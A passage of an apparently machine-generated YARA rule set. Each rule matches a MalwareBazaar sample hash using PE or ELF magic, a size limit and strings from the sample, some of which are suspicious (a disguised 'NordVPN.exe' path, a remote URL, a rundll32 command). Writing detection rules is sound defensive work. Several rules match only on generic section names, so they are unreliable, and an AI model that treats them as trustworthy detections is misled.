        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4701KB and
        all of them
}

rule Windows_76b3c31e85744ca236f9963da6fa3bc70a7c92ac5c1f19afcbeb61f17966837d
{
    meta:
        description = "Auto ML: 76b3c31e85744ca236f9963da6fa3bc70a7c92ac5c1f19afcbeb61f17966837d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1392KB and
        all of them
}

rule Windows_76efda6c81b51a09ca94c5aa645cf08d2bf876cc0ead4855ba57582bb32bcb2d
{
    meta:
        description = "Auto ML: 76efda6c81b51a09ca94c5aa645cf08d2bf876cc0ead4855ba57582bb32bcb2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "RegDeleteKeyExW"
        $s7 = "UnRegisterTypeLibForUser"
        $s8 = "RegisterTypeLibForUser"
        $s9 = "f:\\CB\\ARM_Sustaining\\BuildResults\\bin\\Win32\\Release\\armsvc.pdb"
        $s10 = "FindFirstFileW"
        $s11 = "LoadResource"
        $s12 = "LoadLibraryExW"
        $s13 = "GetModuleHandleW"
        $s14 = "GetFileAttributesW"
        $s15 = "GetModuleFileNameW"
        $s16 = "GetLastError"
        $s17 = "GetProcAddress"
        $s18 = "FindClose"
        $s19 = "DeleteCriticalSection"
        $s20 = "GetCurrentThreadId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 622KB and
        all of them
}

rule Windows_76f5084bca22085b3c76484470899bcb77f86d41208d354cacd8129f0b464b00
{
    meta:
        description = "Auto ML: 76f5084bca22085b3c76484470899bcb77f86d41208d354cacd8129f0b464b00"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB and
        all of them
}

rule Windows_76fb1494f160bb15a94de3401187fa0f4e64c1cff9a4dad27f0b24a8c8786950
{
    meta:
        description = "Auto ML: 76fb1494f160bb15a94de3401187fa0f4e64c1cff9a4dad27f0b24a8c8786950"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = "rundll32.exe %sadvpack.dll,DelNodeRunDLL32 \"%s\""
        $s20 = "System\\CurrentControlSet\\Control\\Session Manager"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB and
        all of them
}

rule Windows_76fcc7de4d18b697a31318fd75ccffcda3afc056756aea7019e44d32b95c68c9
{
    meta:
        description = "Auto ML: 76fcc7de4d18b697a31318fd75ccffcda3afc056756aea7019e44d32b95c68c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "kernel32H"
        $s6 = "LoadLibrH"
        $s7 = "SystemFuH"
        $s8 = "RtlGetCuH"
        $s9 = "tlGetCurH"
        $s10 = "RtlGetNtH"
        $s11 = "winmm.dlH"
        $s12 = "WSAGetOvH"
        $s13 = "wine_getH"
        $s14 = "GetSysteH"
        $s15 = "time.DatH"
        $s16 = ";fileu"
        $s17 = "?fileumH"
        $s18 = "lwInH"
        $s19 = "FileOpti"
        $s20 = "FileOptif"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15290KB and
        all of them
}

rule Windows_77430aa81eed0b76a3630f65f2767fc50cd097872eedbbd9487ba251bf991246
{
    meta:
        description = "Auto ML: 77430aa81eed0b76a3630f65f2767fc50cd097872eedbbd9487ba251bf991246"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3023KB and
        all of them
}

rule Windows_7761e6403caabbe4742e7afaf1be7dbf908974fd6d9f8367ca44352ea79a96a7
{
    meta:
        description = "Auto ML: 7761e6403caabbe4742e7afaf1be7dbf908974fd6d9f8367ca44352ea79a96a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3844KB and
        all of them
}

rule Windows_778040234f0fff43b162eb437530346d9ce7a5ddc700f416079db81c844f8f4f
{
    meta:
        description = "Auto ML: 778040234f0fff43b162eb437530346d9ce7a5ddc700f416079db81c844f8f4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6687KB and
        all of them
}

rule Windows_77860a4e448e5bd7c51518fbd24c0e7516ebc5bfbcafafcc2552be4781d1d282
{
    meta:
        description = "Auto ML: 77860a4e448e5bd7c51518fbd24c0e7516ebc5bfbcafafcc2552be4781d1d282"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_0b5a6b652547d225e983046733875ca231e167766c9944e5c35a50ffdcc5a2a3
{
    meta:
        description = "Auto ML: 0b5a6b652547d225e983046733875ca231e167766c9944e5c35a50ffdcc5a2a3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "SetupDiEnumDeviceInfo"
        $s7 = "DeleteCriticalSection"
        $s8 = "GetFinalPathNameByHandleW"
        $s9 = "OpenProcess"
        $s10 = "SetLastError"
        $s11 = "SetFileAttributesA"
        $s12 = "CreateEventA"
        $s13 = "GetCommandLineW"
        $s14 = "KERNEL32.dll"
        $s15 = "GdipSaveImageToFile"
        $s16 = "CRYPT32.dll"
        $s17 = "GetWindowsDirectoryA"
        $s18 = "IsProcessorFeaturePresent"
        $s19 = "DeleteObject"
        $s20 = "GetModuleHandleA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3041KB and
        all of them
}

rule Windows_779645914bf2b4b7d085520366334ca0c2b3467e078ba4a67a350ee51b14249d
{
    meta:
        description = "Auto ML: 779645914bf2b4b7d085520366334ca0c2b3467e078ba4a67a350ee51b14249d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3817KB and
        all of them
}

rule Windows_7799e9fb86d120ff1daa0bee482bfa2cb4e32071c2ee15f5d48b981126890baf
{
    meta:
        description = "Auto ML: 7799e9fb86d120ff1daa0bee482bfa2cb4e32071c2ee15f5d48b981126890baf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_77d2129f3e711b02b280dc1ebbd724abd4091818b49c40a2c984835be121b993
{
    meta:
        description = "Auto ML: 77d2129f3e711b02b280dc1ebbd724abd4091818b49c40a2c984835be121b993"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetHeaderOrFooterInfo>b__56_0"
        $s5 = "<menuitemFilePrint_Click>b__0"
        $s6 = "<SetPlaces>b__0"
        $s7 = "<GetHeaderOrFooterInfo>b__56_1"
        $s8 = "get_DataTable1"
        $s9 = "get_DataColumn1"
        $s10 = "set_DataColumn1"
        $s11 = "DataSet1"
        $s12 = "Microsoft.Win32"
        $s13 = "<GetHeaderOrFooterInfo>b__56_2"
        $s14 = "get_DataColumn2"
        $s15 = "set_DataColumn2"
        $s16 = "<GetHeaderOrFooterInfo>b__56_3"
        $s17 = "<Module>"
        $s18 = "CDM_GETSPEC"
        $s19 = "Program_Files_RISC"
        $s20 = "System.Drawing.Drawing2D"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1113KB and
        all of them
}

rule Windows_77d43860b95e6d41136e4f6e25e9517e9eb15d0b4bf02dde3ffe7a1e5b421a8d
{
    meta:
        description = "Auto ML: 77d43860b95e6d41136e4f6e25e9517e9eb15d0b4bf02dde3ffe7a1e5b421a8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1672KB and
        all of them
}

rule Windows_781fecd030f2f437a89dcf726a45e3eed218043316b35e80770a20a6f4bb62e4
{
    meta:
        description = "Auto ML: 781fecd030f2f437a89dcf726a45e3eed218043316b35e80770a20a6f4bb62e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_cauHoi1"
        $s5 = "set_cauHoi1"
        $s6 = "<Module>"
        $s7 = "get_dapAn_A"
        $s8 = "set_dapAn_A"
        $s9 = "get_dapAn_B"
        $s10 = "set_dapAn_B"
        $s11 = "get_dapAn_C"
        $s12 = "set_dapAn_C"
        $s13 = "get_dapAn_D"
        $s14 = "set_dapAn_D"
        $s15 = "connectSQL"
        $s16 = "System.Media"
        $s17 = "System.Data"
        $s18 = "get_zZkb"
        $s19 = "Read"
        $s20 = "Thread"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 976KB and
        all of them
}

rule Windows_7857094a95ad2877190acd4130d25048a609706ceac62eda44eadc5f6408723f
{
    meta:
        description = "Auto ML: 7857094a95ad2877190acd4130d25048a609706ceac62eda44eadc5f6408723f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "kernel32.dll"
        $s17 = "\\Microsoft\\NordVPN.exe"
        $s18 = "http://joxi.net/4Ak49WQH0GE3Nr.mp3"
        $s19 = "open"
        $s20 = "dget"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 798KB and
        all of them
}

rule Windows_785b701ae714b1e202d2435201c2ee0644e1523ffd691f9c878b859125ee779b
{
    meta:
        description = "Auto ML: 785b701ae714b1e202d2435201c2ee0644e1523ffd691f9c878b859125ee779b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "http/1.1"
        $s7 = "http/1.1H;D$9u"
        $s8 = "?USERu"
        $s9 = "createdate"
        $s10 = "numUsers"
        $s11 = "numOnlineUsers"
        $s12 = "download"
        $s13 = "start cmd /C \"COLOR C && echo. Outdated version, contact JAMESxD"
        $s14 = "keyauth.win"
        $s15 = "; last read: '"
        $s16 = "Couldn't connect to server"
        $s17 = "FTP: The server failed to connect to data port"
        $s18 = "FTP: Accepting server connect has timed out"
        $s19 = "Error in the HTTP2 framing layer"
        $s20 = "FTP: couldn't set file type"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1782KB and
        all of them
}

rule Windows_78b9b7acb9b0da02b05f2532f4f0ab40850e380c494fbd246451a2c18e633240
{
    meta:
        description = "Auto ML: 78b9b7acb9b0da02b05f2532f4f0ab40850e380c494fbd246451a2c18e633240"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Linux_78e2bcf05f0e99561b76bc934fb02c25583201e537565e2e8399912e25a51447
{
    meta:
        description = "Auto ML: 78e2bcf05f0e99561b76bc934fb02c25583201e537565e2e8399912e25a51447"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 84KB and
        all of them
}

rule Windows_78f0c58096e37b9e14c75dee438adab06ea191ac76ee521862663db2331b8a4f
{
    meta:
        description = "Auto ML: 78f0c58096e37b9e14c75dee438adab06ea191ac76ee521862663db2331b8a4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"
        $s6 = "B.rsrc"
        $s7 = "System"
        $s8 = "kernel32.dll"
        $s9 = "GetLongPathNameA"
        $s10 = "Windows"
        $s11 = "TFileName"
        $s12 = "TThreadLocalCounter"
        $s13 = "$TMultiReadExclusiveWriteSynchronizer"
        $s14 = "TModuleInfo"
        $s15 = "GetDiskFreeSpaceExA"
        $s16 = "oleaut32.dll"
        $s17 = "VariantChangeTypeEx"
        $s18 = "EVariantArrayCreateError"
        $s19 = "bdRightToLeftReadingOnly"
        $s20 = "EFileStreamError"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1291KB and
        all of them
}

rule Windows_0b709c39682a018b6bd85b2904e6eea608119251c72a3d9ec542d0a9acb73b58
{
    meta:
        description = "Auto ML: 0b709c39682a018b6bd85b2904e6eea608119251c72a3d9ec542d0a9acb73b58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ICC_PROFILE"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = ",This set of build callbacks has already run."
        $s7 = "An error occurred while attempting to automatically activate registration '{0}'. See the inner exception for information on the source of the failure."
        $s8 = "AA delegate registered to create instances of '{0}' returned null."
        $s9 = "NInstances cannot be created by this activator as it has already been disposed."
        $s10 = "The provided instance of '{0}' has already been used in an activation request. Did you combine a provided instance with non-root/single-instance lifetime/sharing?"
        $s11 = "NThe Disposer object has already been Disposed, so no items can be added to it."
        $s12 = "The tag '{0}' has already been assigned to a parent lifetime scope. If you are using Owned<T> this indicates you may have a circular dependency chain."
        $s13 = "Instances cannot be resolved and nested lifetimes cannot be created from this LifetimeScope as it (or one of its parent scopes) has already been disposed."
        $s14 = "The constructor of type '{0}' attempted to create another instance of itself. This is not permitted because the service is configured to only allowed a single instance per lifetime scope."
        $s15 = "BComponent pipeline has already been built, and cannot be modified."
        $s16 = "-The activation has already been executed: {0}"
        $s17 = "Unable to resolve the type '{0}' because the lifetime scope it belongs in can't be located. The following services are exposed by this registration:"
        $s18 = "BMiddleware provided to the UseRange method must be in phase order."
        $s19 = "@Subclasses of Autofac.Service must override Object.GetHashCode()"
        $s20 = "Target: {0}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8959KB and
        all of them
}

rule Windows_792da83612534b65156bbeb82f175987cd969bee28f7c685623048b75a1e0c98
{
    meta:
        description = "Auto ML: 792da83612534b65156bbeb82f175987cd969bee28f7c685623048b75a1e0c98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_79658843a0028941539f3b437a8d262c78b15e6e58f4b1f7b96bf357b06fa84f
{
    meta:
        description = "Auto ML: 79658843a0028941539f3b437a8d262c78b15e6e58f4b1f7b96bf357b06fa84f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_gGRV"
        $s6 = "get_Khoa"
        $s7 = "set_Khoa"
        $s8 = "System.Data"
        $s9 = "get_Magenta"
        $s10 = "add_Load"
        $s11 = "frmThem_Load"
        $s12 = "BaoCaoBenhAn_Load"
        $s13 = "TraCuuBenhAn_Load"
        $s14 = "set_FormattingEnabled"
        $s15 = "set_DoubleBuffered"
        $s16 = "get_SelectCommand"
        $s17 = "set_SelectCommand"
        $s18 = "CreateInstance"
        $s19 = "set_DataSource"
        $s20 = "get_KeyCode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 785KB and
        all of them
}

rule Windows_797db6f65c21cb64c040a4067ced07167aa3ebf863757e22d18d50df60b6ef2f
{
    meta:
        description = "Auto ML: 797db6f65c21cb64c040a4067ced07167aa3ebf863757e22d18d50df60b6ef2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1496KB and
        all of them
}

rule Windows_799bf4e7659863f98669b2fb8e7d83c40b51381018a1d8486e7fe9ccb3705157
{
    meta:
        description = "Auto ML: 799bf4e7659863f98669b2fb8e7d83c40b51381018a1d8486e7fe9ccb3705157"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<ConnectToClient>b__48_10"
        $s5 = "<CloseLockScreenWindow>b__43_0"
        $s6 = "<ShowLockScreenWindow>b__44_0"
        $s7 = "<OnPageLoaded>b__15_0"
        $s8 = "<GetMacAddress>b__28_0"
        $s9 = "<ConnectToClient>b__48_0"
        $s10 = "<set_TimerEnableScreen>b__0"
        $s11 = "<ConnectToClient>b__48_11"
        $s12 = "<GetMacAddress>b__28_1"
        $s13 = "<ConnectToClient>b__48_1"
        $s14 = "USER32"
        $s15 = "kernel32"
        $s16 = "Microsoft.Win32"
        $s17 = "User32"
        $s18 = "<ConnectToClient>b__48_2"
        $s19 = "<ConnectToClient>b__48_3"
        $s20 = "GetTickCount64"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 52KB and
        all of them
}

rule Windows_79ad3b97b133a46650bd4e9243585e619cb2225a05d8dede6d1aa78a6a54bf19
{
    meta:
        description = "Auto ML: 79ad3b97b133a46650bd4e9243585e619cb2225a05d8dede6d1aa78a6a54bf19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "WriteUInt64"
        $s6 = "GetAsUInt64"
        $s7 = "SetAsUInt64"
        $s8 = "<Module>"
        $s9 = "ES_SYSTEM_REQUIRED"
        $s10 = "get_FormatID"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "ReadServertData"
        $s14 = "System.Collections.Generic"
        $s15 = "get_SendSync"
        $s16 = "EndRead"
        $s17 = "BeginRead"
        $s18 = "Thread"
        $s19 = "Load"
        $s20 = "get_Connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 194KB and
        all of them
}

rule Windows_79e7c800173c86dde9b525ba038c3b41d7724ff1d5d692c1652d748e2e3d34a0
{
    meta:
        description = "Auto ML: 79e7c800173c86dde9b525ba038c3b41d7724ff1d5d692c1652d748e2e3d34a0"
